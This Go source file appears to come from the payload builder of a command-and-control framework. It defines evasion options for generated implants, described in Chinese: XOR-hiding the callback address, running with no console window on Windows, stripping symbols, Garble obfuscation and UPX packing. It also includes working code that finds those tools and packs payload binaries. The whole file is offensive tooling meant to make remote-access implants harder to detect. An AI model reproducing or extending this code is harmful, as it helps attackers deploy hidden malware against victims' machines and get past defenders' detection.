package payload

import (
	"crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type Technique struct {
	ID     string `json:"id"`
	Name   string `json:"name"`
	Desc   string `json:"desc"`
	Always bool   `json:"always"`
	Ready  bool   `json:"ready"`
	Lang   string `json:"lang,omitempty"`
	OS     string `json:"os,omitempty"`
}

func toolUPX() string {
	for _, root := range toolRoots() {
		for _, name := range []string{"upx", "upx.exe", filepath.Join("upx", "upx"), filepath.Join("upx", "upx.exe")} {
			if p, ok := lookFile(filepath.Join(root, name)); ok {
				return p
			}
		}
	}
	if p, err := exec.LookPath("upx"); err == nil {
		return p
	}
	if exe, err := os.Executable(); err == nil {
		dir := filepath.Dir(exe)
		cands := []string{
			filepath.Join(dir, "upx"),
			filepath.Join(dir, "upx.exe"),
		}
		if runtime.GOOS == "darwin" {
			cands = append(cands, filepath.Join(dir, "upx", "mac", "upx"))
		}
		for _, c := range cands {
			if p, ok := lookFile(c); ok {
				return p
			}
		}
	}
	return ""
}

func toolGarble() string {
	for _, root := range toolRoots() {
		if p, ok := lookFile(filepath.Join(root, "garble")); ok {
			return p
		}
		if p, ok := lookFile(filepath.Join(root, "garble.exe")); ok {
			return p
		}
	}
	p, err := exec.LookPath("garble")
	if err != nil {
		return ""
	}
	return p
}

func builtinTechniques() []Technique {
	upx := toolUPX() != ""
	garble := toolGarble() != ""
	return []Technique{
		{ID: "xor", Name: "回连地址 XOR", Desc: "Host/Port 用每构建随机密钥写入配置块，运行时解码。关闭则明文写入。", Ready: true},
		{ID: "gui", Name: "无窗口 GUI", Desc: "Windows 不弹出控制台。C 植入端模板已是 GUI；Go 编译加 -H windowsgui。", Ready: true, OS: "windows"},
		{ID: "strip", Name: "符号剥离", Desc: "Go 编译去掉符号与路径（-s -w -trimpath）。C 模板已剥离。", Ready: true, Lang: "go"},
		{ID: "garble", Name: "Garble 混淆", Desc: "Go 植入端编译时混淆字符串与标识符（garble -literals -tiny）。", Ready: garble, Lang: "go"},
		{ID: "upx", Name: "UPX 加壳", Desc: "用 UPX --best --lzma 压缩生成的可执行文件。", Ready: upx},
		{ID: "wire", Name: "协议流量 XOR", Desc: "xor-tcp 帧加密，与控制端协议绑定，不可关闭。", Always: true, Ready: true},
	}
}

func maybePack(b []byte, filename string, enable bool) ([]byte, bool) {
	if !enable || toolUPX() == "" || len(b) == 0 {
		return b, false
	}
	dir, err := os.MkdirTemp("", "c2-pack-")
	if err != nil {
		return b, false
	}
	defer os.RemoveAll(dir)
	name := filepath.Base(filename)
	if name == "" || name == "." {
		name = "payload.bin"
	}
	out := filepath.Join(dir, name)
	if err := os.WriteFile(out, b, 0o700); err != nil {
		return b, false
	}
	if err := packUPX(out); err != nil {
		return b, false
	}
	packed, err := os.ReadFile(out)
	if err != nil || len(packed) == 0 {
		return b, false
	}
	return packed, true
}

func packUPX(path string) error {
	upx := toolUPX()
	if upx == "" {
		return fmt.Errorf("upx not found")
	}
	cmd := exec.Command(upx, "--best", "--lzma", "-q", path)
	b, err := cmd.CombinedOutput()
	if err != nil {
		msg := strings.TrimSpace(string(b))
		if msg == "" {
			msg = err.Error()
		}
		return fmt.Errorf("upx: %s", msg)
	}
	return nil
}

func randXORKey() byte {
	var b [1]byte
	for i := 0; i < 8; i++ {
		_, _ = rand.Read(b[:])
		if b[0] != 0 {
			return b[0]
		}
	}
	return 0x5A
}
